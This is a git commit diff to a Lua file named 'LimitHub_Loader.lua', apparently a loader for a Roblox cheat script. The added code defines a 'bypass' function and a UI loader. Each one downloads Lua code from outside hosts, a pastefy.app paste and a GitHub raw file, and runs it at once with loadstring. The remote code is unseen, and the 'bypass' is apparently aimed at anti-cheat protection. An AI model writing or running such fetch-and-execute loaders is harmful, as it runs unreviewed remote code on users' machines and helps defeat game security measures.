6c0dd08ab75a95755cc4a4e3b02da2242121af82
Lib <ybanezjosevincent.bshm.cpc@gmail.com>
2025-08-27 19:46:21 +0800

    Update LimitHub_Loader.lua

--- LimitHub_Loader.lua
+++ LimitHub_Loader.lua
@@ -1,1 +1,11 @@
+local function bypass()
+    loadstring(game:HttpGet("https://pastefy.app/2eieVein/raw"))()
+end
+local function loadui()
+  
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/FakeModz/LimitHub/refs/heads/main/LimitHub_Luarmor_E.lua')))()
+
+end
+
+task.spawn(bypass)
+task.spawn(loadui)
